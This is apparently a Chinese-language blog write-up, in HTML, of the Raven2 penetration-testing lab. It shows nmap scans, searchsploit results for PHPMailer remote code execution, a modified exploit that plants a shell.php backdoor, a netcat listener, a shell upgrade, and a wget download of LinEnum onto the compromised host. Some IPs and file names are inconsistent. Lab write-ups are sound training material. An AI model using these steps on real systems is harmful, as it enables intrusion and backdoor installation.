@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>raven2靶场 · 随波逐流の旅店</title>
+<style>:root{--ink:#eaf3ff;--muted:#a9c3dd;--line:rgba(255,255,255,.2);--sky:#3aa3e3;--gold:#e0a545}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{min-height:100vh;color:var(--ink);font:16px/1.85 "PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;background:#0d2137 url('/SAO-bg.jpg') center/cover fixed no-repeat}
+body::before{content:'';position:fixed;inset:0;background:rgba(8,20,36,.7);z-index:-1}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:999px;background:rgba(226,236,248,.16);border:1px solid var(--line);color:#fff;text-decoration:none;font-size:14px;backdrop-filter:blur(12px);transition:.3s}
+.pill:hover{background:rgba(58,163,227,.5)}
+.wrap{max-width:860px;margin:0 auto;padding:44px 22px 80px}
+.panel{margin-top:18px;background:rgba(12,26,44,.62);border:1px solid var(--line);border-radius:20px;padding:34px 36px;backdrop-filter:blur(18px) saturate(140%);box-shadow:0 20px 50px rgba(5,16,30,.4)}
+h1{margin:0 0 14px;font-size:29px;line-height:1.4;color:#fff}
+.meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px;padding-bottom:18px;border-bottom:1px dashed var(--line)}
+.chip{padding:2px 11px;border-radius:999px;background:rgba(255,255,255,.12);border:1px solid var(--line);font-size:12px;color:var(--muted)}
+.chip.date{color:var(--gold)}
+article h2,article h3,article h4{color:#fff;margin:1.6em 0 .6em;line-height:1.45}
+article h2{font-size:23px;border-left:3px solid var(--sky);padding-left:12px}
+article h3{font-size:19px;color:#dcecff}
+article p{margin:.85em 0}
+article a{color:#8fd0ff}
+article img{max-width:100%;border-radius:10px;margin:14px 0}
+article ul,article ol{padding-left:1.5em}
+article li{margin:.35em 0}
+article blockquote{margin:1.2em 0;padding:10px 18px;border-left:3px solid var(--sky);background:rgba(255,255,255,.07);border-radius:0 10px 10px 0;color:var(--muted)}
+article code{background:rgba(255,255,255,.14);padding:2px 6px;border-radius:5px;font-size:.9em;color:#ffd9a8;font-family:Consolas,Monaco,monospace}
+article pre{background:rgba(6,14,26,.85);border:1px solid var(--line);border-radius:12px;padding:16px 18px;overflow:auto;margin:1.2em 0}
+article pre code{background:none;padding:0;color:#d6e6f7;font-size:13.5px;line-height:1.7}
+article table{width:100%;border-collapse:collapse;margin:1.2em 0;font-size:14px}
+article th,article td{border:1px solid var(--line);padding:8px 12px;text-align:left}
+article th{background:rgba(255,255,255,.07);color:#fff}
+article hr{border:none;border-top:1px dashed var(--line);margin:2em 0}
+.img-fallback{display:block;padding:18px;margin:14px 0;border:1px dashed var(--line);border-radius:10px;background:rgba(255,255,255,.05);color:var(--muted);font-size:13px;text-align:center}
+@media(max-width:640px){.panel{padding:22px 18px}.wrap{padding:24px 14px 60px}h1{font-size:22px}}</style>
+</head>
+<body>
+<div class="wrap">
+  <a class="pill" href="/article-list/">← 返回归档</a> <a class="pill" href="/">⌂ 主页</a>
+  <div class="panel">
+    <h1>raven2靶场</h1>
+    <div class="meta"><span class="chip date">2024-06-27</span><span class="chip">分类·靶场</span><span class="chip">#靶场</span></div>
+    <article><h1>raven2靶场</h1>
+<h2>信息收集</h2>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ ifconfig
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.159.129  netmask 255.255.255.0  broadcast 192.168.159.255
+        inet6 fe80::20c:29ff:fe4d:c7ff  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 00:0c:29:4d:c7:ff  txqueuelen 1000  (Ethernet)
+        RX packets 5665  bytes 556139 (543.1 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 7213  bytes 2015885 (1.9 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 8  bytes 480 (480.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 8  bytes 480 (480.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ nmap -sS  192.168.159.0/24
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-27 21:26 CST
+Nmap scan report for 192.168.159.1
+Host is up (0.00037s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+MAC Address: 00:50:56:C0:00:08 (VMware)
+
+Nmap scan report for 192.168.159.2
+Host is up (0.000084s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE
+53/tcp open  domain
+MAC Address: 00:50:56:E1:64:0A (VMware)
+
+Nmap scan report for 192.168.159.132
+Host is up (0.00028s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+111/tcp open  rpcbind
+MAC Address: 00:0C:29:57:62:33 (VMware)
+
+Nmap scan report for 192.168.159.254
+Host is up (0.000054s latency).
+All 1000 scanned ports on 192.168.159.254 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+MAC Address: 00:50:56:FD:C9:B4 (VMware)
+
+Nmap scan report for 192.168.159.129
+Host is up (0.0000040s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap done: 256 IP addresses (5 hosts up) scanned in 12.00 seconds
+
+┌──(kali㉿kali)-[~]
+└─$ nmap -sS -p- 192.168.159.132
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-27 21:26 CST
+Nmap scan report for 192.168.159.132
+Host is up (0.00080s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+60300/tcp open  unknown
+MAC Address: 00:0C:29:57:62:33 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds
+</code></pre>
+<p>访问192.168.169.132:80
+就是一个简答的网站，扫描后台
+<img src="https://pic.imgdb.cn/item/667d701ed9c307b7e9f3f6c0.png" alt="">
+有一个DS_STORE，还有vender</p>
+<p><img src="https://pic.imgdb.cn/item/667d701ed9c307b7e9f3f58b.png" alt=""></p>
+<p>在vender里面可以看到
+<img src="https://pic.imgdb.cn/item/667d701ed9c307b7e9f3f719.png" alt=""></p>
+<p>逐个去看发现存在PHPMailer
+<img src="https://pic.imgdb.cn/item/667d701ed9c307b7e9f3f633.png" alt=""></p>
+<p>并且在version</p>
+<p>里面提示了版本号5.2.16</p>
+<p>看到还有一个wordpress，访问了一下/wordpress</p>
+<p>勉强能看？</p>
+<p>既然是wordpress，我们就可以用wpscan扫描看看</p>
+<p>没啥东西</p>
+<p>不如试试PHPMailer</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ searchsploit PHPMailer
+------------------------------------------------------------ ---------------------------------
+ Exploit Title                                              |  Path
+------------------------------------------------------------ ---------------------------------
+PHPMailer 1.7 - &#39;Data()&#39; Remote Denial of Service           | php/dos/25752.txt
+PHPMailer &lt; 5.2.18 - Remote Code Execution                  | php/webapps/40968.sh
+PHPMailer &lt; 5.2.18 - Remote Code Execution                  | php/webapps/40970.php
+PHPMailer &lt; 5.2.18 - Remote Code Execution                  | php/webapps/40974.py
+PHPMailer &lt; 5.2.19 - Sendmail Argument Injection (Metasploi | multiple/webapps/41688.rb
+PHPMailer &lt; 5.2.20 - Remote Code Execution                  | php/webapps/40969.py
+PHPMailer &lt; 5.2.20 / SwiftMailer &lt; 5.4.5-DEV / Zend Framewo | php/webapps/40986.py
+PHPMailer &lt; 5.2.20 with Exim MTA - Remote Code Execution    | php/webapps/42221.py
+PHPMailer &lt; 5.2.21 - Local File Disclosure                  | php/webapps/43056.py
+WordPress Plugin PHPMailer 4.6 - Host Header Command Inject | php/remote/42024.rb
+------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<p>确实有，而且不少</p>
+<p>下载 php/webapps/40974.py的python文件，并进行修改</p>
+<p><img src="https://pic.imgdb.cn/item/667d8214d9c307b7e91bb5ce.png" alt=""></p>
+<p>其中的意思是在访问/content.php的时候建立一个shell.php的后门文件</p>
+<p>打开地址网站，访问/contact.php，然后监听</p>
+<pre><code>nc -lvp 4444
+</code></pre>
+<p>进去以后先升级交互shell</p>
+<pre><code> python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;;
+</code></pre>
+<p>使用LinEnum(Linux枚举及权限提升检查工具)
+直接下载：
+<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a>
+搭建http服务进行EXP文件传输：
+python3 -m http.server 8000
+进行下载：
+wget <a href="http://192.168.3.2:8000/LinEnum-master/LinEnum.sh">http://192.168.3.2:8000/LinEnum-master/LinEnum.sh</a>
+加执行权限：
+chmod +x LinEnum.sh
+执行：
+(可以查看到Mysql是用root登陆的)
+<img src="https://pic.imgdb.cn/item/667d83a2d9c307b7e91ef6de.png" alt=""></p>
+<pre><code>find ./ -name &quot;flag*&quot;
+</code></pre>
+<p>能看到flag2和3</p>
+<p>然后使用mysql的udf提权
+后面的看一下大佬的吧，我没弄成，等我明天看看原理再说/ww</p>
+<p><a href="https://www.freebuf.com/articles/web/261047.html">https://www.freebuf.com/articles/web/261047.html</a></p>
+</article>
+  </div>
+</div><script>
+  // 正文插图兜底：失效图片替换为占位块，避免出现破图
+  document.querySelectorAll('article img').forEach(function (img) {
+    img.loading = 'lazy';
+    img.addEventListener('error', function () {
+      var ph = document.createElement('span');
+      ph.className = 'img-fallback';
+      ph.textContent = '图片已失效 · ' + (img.getAttribute('alt') || '');
+      if (img.parentNode) img.parentNode.replaceChild(ph, img);
+    });
+  });
+</script></body>
+</html>
